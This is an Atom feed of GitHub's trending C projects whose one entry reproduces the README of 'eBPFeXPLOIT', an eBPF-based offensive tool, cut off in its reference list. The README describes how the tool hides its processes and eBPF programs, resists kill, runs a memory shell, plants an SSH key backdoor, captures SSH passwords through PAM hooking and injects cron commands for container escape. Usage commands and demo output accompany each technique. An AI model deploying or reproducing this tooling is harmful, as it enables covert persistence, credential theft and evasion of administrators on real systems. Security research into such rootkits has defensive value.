<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2024-01-17T01:30:19Z</updated>
  <subtitle>Daily Trending of C in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>bfengj/eBPFeXPLOIT</title>
    <updated>2024-01-17T01:30:19Z</updated>
    <id>tag:github.com,2024-01-17:/bfengj/eBPFeXPLOIT</id>
    <link href="https://github.com/bfengj/eBPFeXPLOIT" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Exploit tool implemented using ebpf.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;eBPFeXPLOIT&lt;/h1&gt; &#xA;&lt;p&gt;eBPFeXPLOIT is a penetration testing tool based on eBPF technology.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Current Features:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Hide its own PID and up to four other specified PIDs, with a maximum of five PIDs hidden for ease of processing.&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;eBPF memory horse (MemoryShell).&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Block the Kill command. Processes with specified PIDs will not be terminated by Kill.&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Hide injected eBPF programs, Maps, and Links in the kernel.&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;ssh backdoor&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;catch the username and password of SSH&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;cron backdoor (can be used for container escape)&lt;/strong&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bfengj/eBPFeXPLOIT/main/README.zh-cn.md&#34;&gt;中文版本(Chinese version)&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Hide Pid&lt;/h2&gt; &#xA;&lt;p&gt;Hide up to four target PIDs and its own PID, totaling five PIDs. By default, it hides its own PID.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;go generate &amp;amp;&amp;amp; go build -o main &amp;amp;&amp;amp; ./main -pid 263959,269942&#xA;&#xA;echo $$&#xA;263959&#xA;ps aux | grep -i &#34;263959&#34;&#xA;root      277863  0.0  0.0   3440  1920 pts/2    S+   13:51   0:00 grep --color=auto -i 263959&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The principle of hiding PIDs lies in the &lt;code&gt;getdents64&lt;/code&gt; system call. In Linux, the &lt;code&gt;getdents64&lt;/code&gt; system call reads file information in a directory, and commands like &lt;code&gt;ps&lt;/code&gt; use &lt;code&gt;getdents64&lt;/code&gt; to obtain process-related information from files in the &lt;code&gt;/proc/&lt;/code&gt; directory.&lt;/p&gt; &#xA;&lt;p&gt;The second parameter of &lt;code&gt;ctx&lt;/code&gt; is &lt;code&gt;linux_dirent64 *dirp&lt;/code&gt;, structured as follows:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;struct linux_dirent64 {&#xA;    u64        d_ino;    /* 64-bit inode number */&#xA;    u64        d_off;    /* 64-bit offset to next structure */&#xA;    unsigned short d_reclen; /* Size of this dirent */&#xA;    unsigned char  d_type;   /* File type */&#xA;    char           d_name[]; /* Filename (null-terminated) */ };&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;It represents the entries in the directory that &lt;code&gt;getdents64&lt;/code&gt; will access. The first two fields are less significant, the third indicates the length of the current &lt;code&gt;linux_dirent64&lt;/code&gt;, and the fifth &lt;code&gt;d_name&lt;/code&gt; is the filename of the target, e.g., for &lt;code&gt;pid&lt;/code&gt; 200, it would be &lt;code&gt;/proc/200&lt;/code&gt;, so &lt;code&gt;d_name&lt;/code&gt; is 200.&lt;/p&gt; &#xA;&lt;p&gt;By hooking this process and modifying the &lt;code&gt;d_reclen&lt;/code&gt; of the previous &lt;code&gt;linux_dirent64&lt;/code&gt; to &lt;code&gt;d_reclen_previous + d_reclen&lt;/code&gt;, the target PID&#39;s file can be skipped, thus hiding the PID.&lt;/p&gt; &#xA;&lt;p&gt;However, due to complex logic, hiding too many PIDs can cause the verifier to fail, so including the program itself, a maximum of five can be hidden.&lt;/p&gt; &#xA;&lt;h2&gt;ebpf-MemoryShell&lt;/h2&gt; &#xA;&lt;p&gt;It can implement basic MemoryShell functionality, but there are a series of issues:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Temporary lack of handling for fragmented transmission.&lt;/li&gt; &#xA; &lt;li&gt;My local Linux VM has issues, unable to properly configure tc to only receive egress traffic, resulting in tc receiving both egress and ingress traffic, which relatively decreases performance.&lt;/li&gt; &#xA; &lt;li&gt;Command execution is in user space.&lt;/li&gt; &#xA; &lt;li&gt;Command execution must be placed in the last parameter of get, as otherwise, it&#39;s too complex for eBPF kernel-side processing and fails to pass the verifier.&lt;/li&gt; &#xA; &lt;li&gt;The original HTTP response byte count must be larger than the command execution result byte count for complete echo back. I tried expanding the HTTP response packet. It&#39;s possible to use &lt;code&gt;bpf_skb_change_tail&lt;/code&gt; for expansion, but it&#39;s also necessary to modify the &lt;code&gt;Content-Length&lt;/code&gt; value in the HTTP response header, which is very complex and fails to pass the verifier.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;In terms of network packet processing performance, XDP is superior to TC, which is superior to hooking syscalls. Therefore, XDP is always the first choice, but XDP can only receive ingress traffic, while TC can receive egress traffic, so they are processed separately.&lt;/p&gt; &#xA;&lt;p&gt;XDP sends the received commands to user space for execution, and then the user space sends the execution results back to TC, writing the results into the HTTP response. If the execution results are to be fully echoed back, an HTTP response with more bytes than the result is generally easy to find.&lt;/p&gt; &#xA;&lt;p&gt;Although the &lt;code&gt;dexec&lt;/code&gt; option is provided, the functionality of &lt;code&gt;dexec=0&lt;/code&gt; has not yet been implemented.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;&#xA;./main --help&#xA;Usage of ./main:&#xA;  -dexec string&#xA;        directly exec or not (default &#34;-1&#34;)&#xA;  -ifname string&#xA;        interface xdp and tc will attach&#xA;  -pid string&#xA;        pid to hide (default &#34;-1&#34;)&#xA;&#xA;./main -ifname lo -dexec 1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bfengj/eBPFeXPLOIT/main/README_EN.assets/image-20240109131903910.png&#34; alt=&#34;image-20240109131903910&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Prevent Kill&lt;/h2&gt; &#xA;&lt;p&gt;Even if the PID is hidden, if the operations team still somehow knows our program&#39;s PID, we need to prevent the Kill command from terminating our process.&lt;/p&gt; &#xA;&lt;p&gt;First, hook &lt;code&gt;lsm/task_kill&lt;/code&gt;, and when encountering a protected PID, &lt;code&gt;return -EPERM&lt;/code&gt; to prevent subsequent execution.&lt;/p&gt; &#xA;&lt;p&gt;Also, hook &lt;code&gt;kretprobe/sys_kill&lt;/code&gt;, and when the syscall returns, modify the return value to &lt;code&gt;-ESRCH&lt;/code&gt; to pretend the process does not exist:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;&#xA;go build -o main &amp;amp;&amp;amp; ./main&#xA;2024/01/06 19:19:40 current pid:398235&#xA;2024/01/06 19:19:40 Waiting for events..&#xA;&#xA;kill -9 398235&#xA;bash: kill: (398235) - No such process&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;I considered using kprobe or tp, but there was no good way to prevent subsequent processing at the time of entry, so I had to use lsm, but it doesn&#39;t seem like the best method.&lt;/p&gt; &#xA;&lt;p&gt;I considered directly overwriting the return in kprobe, but I always had trouble correctly getting the PID parameter without using the &lt;code&gt;BPF_KPROBE&lt;/code&gt; macro. It might be a problem with my VM, as I&#39;ve been developing under a very high version of the Linux kernel and on arm64 architecture. It seems there are significant issues, and I need to find a way to develop remotely on an amd64 architecture Linux (since I&#39;m developing eBPF on a Mac VM).&lt;/p&gt; &#xA;&lt;h2&gt;Hide eBPF Program&lt;/h2&gt; &#xA;&lt;p&gt;Although the user-space program&#39;s PID is hidden, commands like &lt;code&gt;bpftool prog list&lt;/code&gt; can still discover our eBPF program injected into the kernel. However, considering that most Linux systems won&#39;t install &lt;code&gt;bpftool&lt;/code&gt;, and operations might not even know what eBPF is, the likelihood of the injected eBPF program being discovered is very low. Therefore, this part of the process is relatively simple. Refer to the content in the book &#34;Learning eBPF&#34;. Viewing progs or maps generally goes through the following process:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;&#xA;[0000ffffb38e1aa8] bpf(BPF_PROG_GET_NEXT_ID, {start_id=0, next_id=0, open_flags=0}, 12) = 0&#xA;[0000ffffb38e1aa8] bpf(BPF_PROG_GET_FD_BY_ID, {prog_id=2, next_id=0, open_flags=0}, 12) = 3&#xA;[0000ffffb38e1aa8] bpf(BPF_OBJ_GET_INFO_BY_FD, {info={bpf_fd=3, info_len=232, info=0xffffc95ef490}}, 16) = 0&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;First, use &lt;code&gt;BPF_PROG_GET_NEXT_ID&lt;/code&gt; to get the ID, then &lt;code&gt;BPF_PROG_GET_FD_BY_ID&lt;/code&gt; to get the fd, and finally &lt;code&gt;BPF_OBJ_GET_INFO_BY_FD&lt;/code&gt; to get the related obj. This process repeats until &lt;code&gt;BPF_PROG_GET_NEXT_ID&lt;/code&gt; can&#39;t find a related ID.&lt;/p&gt; &#xA;&lt;p&gt;Therefore, directly hook the bpf syscall, and when encountering &lt;code&gt;BPF_PROG_GET_NEXT_ID&lt;/code&gt;, &lt;code&gt;BPF_MAP_GET_NEXT_ID&lt;/code&gt;, and &lt;code&gt;BPF_LINK_GET_NEXT_ID&lt;/code&gt;, process accordingly.&lt;/p&gt; &#xA;&lt;h2&gt;ssh backdoor&lt;/h2&gt; &#xA;&lt;p&gt;The ssh backdoor is based on the following principle:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Generate a key pair: First, generate a pair of keys on the client side, including a public key and a private key. Key pairs are usually generated using RSA or DSA algorithms. The private key should be kept confidential, while the public key can be distributed where needed;&lt;/li&gt; &#xA; &lt;li&gt;Distribute the public key: Copy the public key generated by the client to the &lt;code&gt;~/.ssh/authorized_keys&lt;/code&gt; file on the target host where passwordless login is to be enabled. This file stores a list of public keys that are allowed to access the host;&lt;/li&gt; &#xA; &lt;li&gt;Connection authentication: When the client attempts to connect to the target host, the target host sends a random challenge to the client. The client uses its private key to sign the challenge and sends the signature back to the target host;&lt;/li&gt; &#xA; &lt;li&gt;Verify the signature: The target host uses the previously stored client public key to verify the signature sent by the client. If the signature verification is successful, the target host confirms the identity of the client and allows passwordless login.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;When ssh login in with a key, it reads the public key in the &lt;code&gt;authorised_keys&lt;/code&gt; file. A hidden ssh backdoor can be achieved by using the eBPF program to hook systems such as openat and read, and replacing the public key in &lt;code&gt;authorized_keys&lt;/code&gt; with our own.&lt;/p&gt; &#xA;&lt;p&gt;The program fills the target &lt;code&gt;authorised_keys&lt;/code&gt; with a lot of spaces, considering that there may not be enough bytes inside the previous &lt;code&gt;authorized_keys&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Catch Ssh Username and Password&lt;/h2&gt; &#xA;&lt;p&gt;hook &lt;code&gt;pam_get_authtok&lt;/code&gt; to catch ssh username and password. Requires an absolute path of &lt;code&gt;libpam.so.0&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Cron backdoor&lt;/h2&gt; &#xA;&lt;p&gt;Idea from &lt;a href=&#34;https://mp.weixin.qq.com/s/Psqy3X3VdUPga7f2cnct1g&#34;&gt;Cloud Native Security Attack and Defence | Analysis and Practice of Container Escape Techniques Using eBPF&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Normal use can create a hard-to-discover cron backdoor that enables container escape in a container environment with &lt;code&gt;CAP_SYS_ADMIN&lt;/code&gt; privileges.&lt;/p&gt; &#xA;&lt;p&gt;Looking at the cron process via &lt;code&gt;strace&lt;/code&gt; reveals that &lt;code&gt;newfstatat&lt;/code&gt; is called three times to read &lt;code&gt;/etc/crontab&lt;/code&gt;, the third time with &lt;code&gt;newfstatat(5, &#34;&#34;, {st_mode=S_IFREG|0644, st_size=1136, ...} , AT_EMPTY_PATH) = 0&lt;/code&gt;, so the code also needs to pay attention to the judgement of &lt;code&gt;dtd&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;strace -p 1042&#xA;strace: Process 1042 attached&#xA;restart_syscall(&amp;lt;... resuming interrupted io_setup ...&amp;gt;) = 0&#xA;newfstatat(AT_FDCWD, &#34;/etc/localtime&#34;, {st_mode=S_IFREG|0644, st_size=561, ...}, 0) = 0&#xA;newfstatat(AT_FDCWD, &#34;crontabs&#34;, {st_mode=S_IFDIR|S_ISVTX|0730, st_size=4096, ...}, 0) = 0&#xA;newfstatat(AT_FDCWD, &#34;/etc/crontab&#34;, {st_mode=S_IFREG|0644, st_size=1136, ...}, 0) = 0&#xA;newfstatat(AT_FDCWD, &#34;/etc/cron.d&#34;, {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0&#xA;newfstatat(AT_FDCWD, &#34;/etc/cron.d/anacron&#34;, {st_mode=S_IFREG|0644, st_size=219, ...}, 0) = 0&#xA;newfstatat(AT_FDCWD, &#34;/etc/cron.d/e2scrub_all&#34;, {st_mode=S_IFREG|0644, st_size=202, ...}, 0) = 0&#xA;newfstatat(AT_FDCWD, &#34;/etc/crontab&#34;, {st_mode=S_IFREG|0644, st_size=1136, ...}, AT_SYMLINK_NOFOLLOW) = 0&#xA;openat(AT_FDCWD, &#34;/etc/crontab&#34;, O_RDONLY) = 5&#xA;newfstatat(5, &#34;&#34;, {st_mode=S_IFREG|0644, st_size=1136, ...}, AT_EMPTY_PATH) = 0&#xA;getpid()                                = 1042&#xA;getpid()                                = 1042&#xA;sendto(4, &#34;&amp;lt;78&amp;gt;Jan 14 18:50:01 cron[1042]: &#34;..., 64, MSG_NOSIGNAL, NULL, 0) = 64&#xA;fcntl(5, F_GETFL)                       = 0x20000 (flags O_RDONLY|O_LARGEFILE)&#xA;lseek(5, 0, SEEK_CUR)                   = 0&#xA;newfstatat(5, &#34;&#34;, {st_mode=S_IFREG|0644, st_size=1136, ...}, AT_EMPTY_PATH) = 0&#xA;read(5, &#34;* * * * * root /bin/sh -c \&#34;curl &#34;..., 4096) = 1136&#xA;lseek(5, 0, SEEK_SET)                   = 0&#xA;read(5, &#34;* * * * * root /bin/sh -c \&#34;curl &#34;..., 4096) = 1136&#xA;....&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;By hooking the process in question, it is possible to inject malicious commands into &lt;code&gt;/etc/crontab&lt;/code&gt; every minute when cron checks it.&lt;/p&gt; &#xA;&lt;p&gt;The backdoor is targeted at &lt;code&gt;vixie-cron&lt;/code&gt;, no other version of &lt;code&gt;cron&lt;/code&gt; has been tested.&lt;/p&gt; &#xA;&lt;h2&gt;How to Use&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;./main --help&#xA;Usage of ./main:&#xA;  -catchssh string&#xA;        catch the ssh username and password or not (default &#34;-1&#34;)&#xA;  -croncmd string&#xA;        the cmd that cron will execute.If you want to use quotes, use single quotes&#xA;  -dexec string&#xA;        directly exec or not (default &#34;-1&#34;)&#xA;  -hideebpf string&#xA;        hide or not hide the ebpf prog ,map and link (default &#34;1&#34;)&#xA;  -ifname string&#xA;        interface xdp and tc will attach&#xA;  -pampath string&#xA;        the absolute path of libpam.so.0,maybe need &#39;find / -name libpam.so.0&#39;&#xA;  -pid string&#xA;        pid to hide (default &#34;-1&#34;)&#xA;  -selfpubkey string&#xA;        the ssh public key file path we generate,such as ./id_rsa.pub&#xA;  -targetpubkey string&#xA;        the ssh public key path the user we want to login,such as /root/.ssh/authorized_keys&#xA;&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Hide PIDs&lt;/h3&gt; &#xA;&lt;p&gt;by default, the program&#39;s own PID is hidden:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;./main -pid 263959,269942&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Memory shell&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;./main -ifname lo -dexec 1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;code&gt;ifname&lt;/code&gt; specifies the network interface, set &lt;code&gt;dexec&lt;/code&gt; to 1.If the program encounters issues on tc and is not cleared, you can manually clear it:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;tc qdisc del dev lo clsact&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Replace &#39;lo&#39; with your network interface as needed.&lt;/p&gt; &#xA;&lt;h3&gt;Prevent Kill&lt;/h3&gt; &#xA;&lt;p&gt;default functionality, for PIDs&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;go build -o main &amp;amp;&amp;amp; ./main&#xA;2024/01/06 19:19:40 current pid:398235&#xA;2024/01/06 19:19:40 Waiting for events..&#xA;&#xA;kill -9 398235&#xA;bash: kill: (398235) - No such process&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Hide eBPF program&lt;/h3&gt; &#xA;&lt;p&gt;hidden by default&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;go build -o main &amp;amp;&amp;amp; ./main&#xA;&#xA;# All results are empty&#xA;bpftool prog list&#xA;bpftool map list&#xA;bpftool link list&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;ssh backdoor&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;./main -selfpubkey ./id_rsa.pub -targetpubkey /home/parallels/.ssh/authorized_keys&#xA;&#xA;&#xA;13:24:47 › ssh -i ./id_rsa parallels@10.211.55.11&#xA;parallels@10.211.55.11&#39;s password:&#xA;&#xA;13:26:29 › ssh -i ./id_rsa parallels@10.211.55.11&#xA;Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.5.13-060513-generic aarch64)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;catch the username and password of ssh&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;find / -name libpam.so.0&#xA;./main -catchssh 1 -pampath /usr/lib/aarch64-linux-gnu/libpam.so.0&#xA;2024/01/12 13:39:23 current pid:97335&#xA;2024/01/12 13:39:24 Waiting for events..&#xA;2024/01/12 13:39:28 =================================================================&#xA;2024/01/12 13:39:28 [+]receive SSH Username:feng&#xA;2024/01/12 13:39:28 [+]receive SSH Password:qweqweqeqweqw&#xA;2024/01/12 13:39:28 =================================================================&#xA;&#xA;&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;13:39:07 › ssh feng@10.211.55.11&#xA;feng@10.211.55.11&#39;s password:&#xA;Permission denied, please try again.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;cron backdoor&lt;/h3&gt; &#xA;&lt;p&gt;Use single quotes if you want to put quotes in the executed command.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt; ./main -croncmd &#34;curl http://127.0.0.1:39123/&#34;&#xA;2024/01/14 18:55:38 current pid:295190&#xA;2024/01/14 18:55:39 Waiting for events..&#xA;&#xA;&#xA;python3 -m http.server 39123&#xA;Serving HTTP on 0.0.0.0 port 39123 (http://0.0.0.0:39123/) ...&#xA;127.0.0.1 - - [14/Jan/2024 18:56:01] &#34;GET / HTTP/1.1&#34; 200 -&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The current program only provides simple functionality, so after starting the program, press &lt;code&gt;ctrl+c&lt;/code&gt; to stop it.&lt;/p&gt; &#xA;&lt;p&gt;The program uses newer features like &lt;code&gt;BPF_MAP_TYPE_RINGBUF&lt;/code&gt;. I didn&#39;t check the minimum version requirements in detail, but according to GPT, it&#39;s roughly Kernel 5.8 and above.&lt;/p&gt; &#xA;&lt;p&gt;So, it should work on Linux kernels version 5.8 and above. &lt;strong&gt;Additionally, the program needs to be run with root privileges.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;The executable is cross-compiled with Go, theoretically executable on other architectures? This is my kernel version:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;&#xA;uname -a&#xA;Linux ubuntu-linux-22-04-02-desktop 6.5.13-060513-generic #202311281736 SMP PREEMPT_DYNAMIC Tue Nov 28 18:10:14 UTC 2023 aarch64 aarch64 aarch64 GNU/Linux&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Manual Compilation&lt;/h2&gt; &#xA;&lt;p&gt;Due to the use of architecture-specific macros in the code, users need to compile it themselves according to the architecture they are using.&lt;/p&gt; &#xA;&lt;p&gt;The compilation environment needs to be set up according to &lt;a href=&#34;https://ebpf-go.dev/guides/getting-started/&#34;&gt;Getting Started - ebpf-go Documentation&lt;/a&gt;, as Go is used in the user space. Additionally, the basic environment for compiling eBPF needs to be installed.&lt;/p&gt; &#xA;&lt;p&gt;It is best to follow the instructions in the article for installation. I will only mention some steps below, and there might be omissions.&lt;/p&gt; &#xA;&lt;p&gt;Firstly, for the basic eBPF compilation environment, you need to install clang, preferably between versions clang11 and clang14. Versions within this range have been tested and are error-free.&lt;/p&gt; &#xA;&lt;p&gt;Then, install &lt;code&gt;libbpf&lt;/code&gt;. For Debian/Ubuntu, you need &lt;code&gt;libbpf-dev&lt;/code&gt;. On Fedora, it is &lt;code&gt;libbpf-devel&lt;/code&gt;. If the installation fails, you can manually compile &lt;code&gt;libbpf&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/libbpf/libbpf.git&#xA;cd libbpf&#xA;cd src&#xA;sudo make&#xA;sudo make install&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Next, install the Linux kernel headers. On &lt;code&gt;AMD64 Debian/Ubuntu&lt;/code&gt;, install &lt;code&gt;linux-headers-amd64&lt;/code&gt;. On &lt;code&gt;Fedora&lt;/code&gt;, install &lt;code&gt;kernel-devel&lt;/code&gt;. On Debian, you might also need &lt;code&gt;ln -sf /usr/include/asm-generic/ /usr/include/&lt;/code&gt;, otherwise, you may not find &lt;code&gt;&amp;lt;asm/types.h&amp;gt;&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;The &lt;code&gt;vmlinux.h&lt;/code&gt; in the &lt;code&gt;ebpf&lt;/code&gt; directory can be generated by yourself, as my &lt;code&gt;vmlinux.h&lt;/code&gt; was generated under the arm64 architecture and may not work on &lt;code&gt;amd64&lt;/code&gt;. First, install &lt;code&gt;bpftool&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo apt install -y linux-tools-$(uname -r)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you cannot install it, you can compile it from the source:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo apt install build-essential \&#xA;        libelf-dev \&#xA;        libz-dev \&#xA;        libcap-dev \&#xA;        binutils-dev \&#xA;        pkg-config&#xA;git clone https://github.com/libbpf/bpftool.git&#xA;cd bpftool&#xA;git submodule update --init&#xA;cd src&#xA;sudo make&#xA;sudo make install&#xA;bpftool v -p&#xA;{&#xA;    &#34;version&#34;: &#34;7.3.0&#34;,&#xA;    &#34;libbpf_version&#34;: &#34;1.3&#34;,&#xA;    &#34;features&#34;: {&#xA;        &#34;libbfd&#34;: false,&#xA;        &#34;llvm&#34;: true,&#xA;        &#34;skeletons&#34;: true,&#xA;        &#34;bootstrap&#34;: false&#xA;    }&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Then generate &lt;code&gt;vmlinux.h&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;bpftool btf dump file /sys/kernel/btf/vmlinux format c &amp;gt; vmlinux.h&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you want to install the complete eBPF environment from scratch, you can refer to &lt;a href=&#34;https://yaoyao.io/posts/how-to-setup-ebpf-env-on-ubuntu&#34;&gt;How to Set Up an eBPF Development Environment on Ubuntu | YaoYao’s Blog&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;After setting up the compilation environment, the next step is to compile the source code. First, you need to install Go dependencies:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;go mod download&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Then compile the source code. First, modify &lt;code&gt;gen.go&lt;/code&gt;, changing the &lt;code&gt;-target&lt;/code&gt; to &lt;code&gt;arm64&lt;/code&gt; or &lt;code&gt;amd64&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Then you can compile:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;go generate&#xA;go build -o eBPFeXPLOIT&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;TODO&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Currently, everything does not consider pinning the program and Map to the fs, only to provide convenient functionality. Once the overall functionality is almost implemented, pinning might be considered.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Compatibility with lower versions of Linux. I used many new features while writing the code, leading to incompatibility with lower versions of Linux kernels.&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Add container escape functionality module.&lt;/strong&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Disclaimer&lt;/h2&gt; &#xA;&lt;p&gt;If you commit any unlawful acts in the course of using the Tool, you are responsible for the consequences and we will not be liable for any legal and joint liability.&lt;/p&gt; &#xA;&lt;p&gt;Unless you have fully read, fully understand and accept all the terms of this Agreement, please do not install and use the Tool. Your use of the behaviour or your acceptance of this Agreement in any other express or implied manner is deemed to have read and agreed to the constraints of this Agreement.&lt;/p&gt; &#xA;&lt;h2&gt;References&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://colobu.com/2017/06/19/advanced-command-execution-in-Go-with-os-exec/&#34;&gt;[译]使用os/exec执行命令&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/eunomia-bpf/bpf-developer-tutorial/raw/main/src/23-http/README.md&#34;&gt;bpf-developer-tutorial/src/23-http/README.md at main · eunomia-bpf/bpf-developer-tutorial&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://d0u9.io/use-cilium-ebpf-to-compile-and-load-tc-bpf-code/&#34;&gt;使用cilium/ebpf编译并加载TC BPF代码&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/Gui774ume/ebpfkit&#34;&gt;Gui774ume/ebpfkit: ebpfkit is a rootkit powered by eBPF&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/pathtofile/bad-bpf&#34;&gt;pathtofile/bad-bpf: A collection of eBPF programs demonstrating bad behavior, presented at DEF CON 29&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://samwho.dev/blog/emulating-bad-networks/&#34;&gt;Emulating Bad Networks&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.infradead.org/~tgr/libnl/doc/route.html#route_tc&#34;&gt;Routing Family Netlink Library (libnl-route)&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/florianl/go-tc/issues/32&#34;&gt;Attaching EBPF program returns no such file or directory · Issue #32 · florianl/go-tc&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://pkg.go.dev/github.com/florianl/go-tc#section-readme&#34;&gt;tc package - github.com/florianl/go-tc - Go Packages&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://blog.gmem.cc/ebpf&#34;&gt;绿色记忆:eBPF学习笔记&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/Esonhugh/sshd_backdoor&#34;&gt;Esonhugh/sshd_backdoor: /root/.ssh/authorized_keys evil file watchdog with ebpf tracepoint hook.&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a 